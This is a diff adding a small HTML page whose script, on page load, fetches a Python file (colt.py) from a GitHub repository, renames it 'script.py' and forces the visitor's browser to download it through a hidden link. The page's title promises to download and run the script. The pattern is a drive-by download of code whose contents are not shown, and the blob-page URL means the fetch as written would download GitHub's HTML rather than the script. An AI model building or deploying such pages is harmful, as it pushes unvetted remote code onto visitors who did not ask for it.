@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download and Run Python Script</title>
+</head>
+<body>
+    <h1>Downloading and Running Python Script...</h1>
+    <script>
+        const scriptUrl = 'https://github.com/THEENlGMA/cautious-meme/blob/a8ffdf56b7da7b1fe6f708d61ae48cd9f5536c01/colt.py';
+        const scriptName = 'script.py';
+
+        fetch(scriptUrl)
+            .then(response => response.text())
+            .then(script => {
+                const blob = new Blob([script], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = scriptName;
+                document.body.appendChild(a);
+                a.click();
+                URL.revokeObjectURL(url);
+                document.body.removeChild(a);
+            })
+            .catch(error => console.error('Error downloading script:', error));
+    </script>
+</body>
+</html>
